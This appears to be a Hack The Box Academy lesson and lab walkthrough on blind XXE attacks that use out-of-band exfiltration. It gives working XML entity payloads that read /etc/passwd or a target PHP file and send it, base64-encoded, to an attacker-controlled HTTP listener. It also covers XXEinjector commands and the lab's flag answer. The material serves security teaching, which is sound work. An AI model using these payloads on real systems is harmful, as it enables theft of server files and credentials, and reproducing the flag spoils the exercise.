In the previous section, we saw an example of a blind XXE vulnerability, where we did not receive any output containing any of our XML input entities. As the web server was displaying PHP runtime errors, we could use this flaw to read the content of files from the displayed errors. In this section, we will see how we can get the content of files in a completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed.

## Out-of-band Data Exfiltration

If we try to repeat any of the methods with the exercise we find at `/blind`, we will quickly notice that none of them seem to work, as we have no way to have anything printed on the web application response. For such cases, we can utilize a method known as `Out-of-band (OOB) Data Exfiltration`, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE. Both the [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss) and the [Whitebox Pentesting 101: Command Injections](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) modules discussed similar attacks, and here we will utilize a similar attack, with slight modifications to fit our XXE vulnerability.

In our previous attacks, we utilized an `out-of-band` attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). So, our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.

To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:

Code: xml

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, we can decode the `WFhFX1NBTVBMRV9EQVRB` string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:

Code: php

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

So, we will first write the above PHP code to `index.php`, and then start a PHP server on port `8000`, as follows:

  Blind Data Exfiltration

```shell-session
xF1NN@htb[/htb]$ vi index.php # here we write the above PHP code
xF1NN@htb[/htb]$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add `<root>&content;</root>`, which is needed to reference our entity and have it send the request to our machine with the file content:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Then, we can send our request to the web application: ![HTTP POST request to /blind/submitDetails.php with XML DOCTYPE for XXE attack, resulting in a 200 OK response instructing to check email.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg)

Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content:

  Blind Data Exfiltration

```shell-session
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

**Tip:** In addition to storing our base64 encoded data as a parameter to our URL, we may utilize `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.

## Automated OOB Exfiltration

Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.

To use this tool for automated OOB exfiltration, we can first clone the tool to our machine, as follows:

  Blind Data Exfiltration

```shell-session
xF1NN@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git

Cloning into 'XXEinjector'...
...SNIP...
```

Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:

Code: http

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:

  Blind Data Exfiltration

```shell-session
xF1NN@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:

  Blind Data Exfiltration

```shell-session
xF1NN@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```

Try to use the tool to repeat other XXE methods we learned.

## Question 1

### "Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag."

After spawning the target machine, students first need to create the OOB DTD file on Pwnbox/`PMVPN`:

Code: shell

```shell
cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://PWNIP:PWNPO/?content=%file;'>">
EOF
```

  Blind Data Exfiltration

```shell-session
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.134:8000/?content=%file;'>">
EOF
```

Afterward, students need to start an HTTP server:

Code: shell

```shell
python3 -m http.server PWNPO
```

  Blind Data Exfiltration

```shell-session
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Afterward, students need to run `Burp Suite`, make sure that FoxyProxy is set to the preconfigured option "Burp (8080)" in Firefox, and intercept the request to `/blind/submitDetails.php` to change its request method from `GET` to `POST`:

![Web_Attacks_Walkthrough_Image_32.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_32.png)

Subsequently, students need to send the below XML data by appending it at the end of the request:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE email [ 
	<!ENTITY % remote SYSTEM "http://PWNIP:8000/XXE.dtd">
	  %remote;
	  %oob;
	]>
	<root>
		&content;
	</root>
```

![Web_Attacks_Walkthrough_Image_33.png](https://academy.hackthebox.com/storage/walkthroughs/57/Web_Attacks_Walkthrough_Image_33.png)

After forwarding the request, students will notice that their HTTP server has gotten a request for the "XXE.dtd" file, along with the base64 encoded string of the PHP file:

  Blind Data Exfiltration

```shell-session
10.129.138.36 - - [21/Jul/2022 18:57:49] "GET /XXE.dtd HTTP/1.0" 200 -
10.129.138.36 - - [21/Jul/2022 18:57:49] "GET /?content=PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K HTTP/1.0" 200 -
```

Decoding the base64 string yields out the flag `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`:

Code: shell

```shell
echo "PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K" | base64 -d
```

  Blind Data Exfiltration

```shell-session
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo "PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K" | base64 -d

<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
```
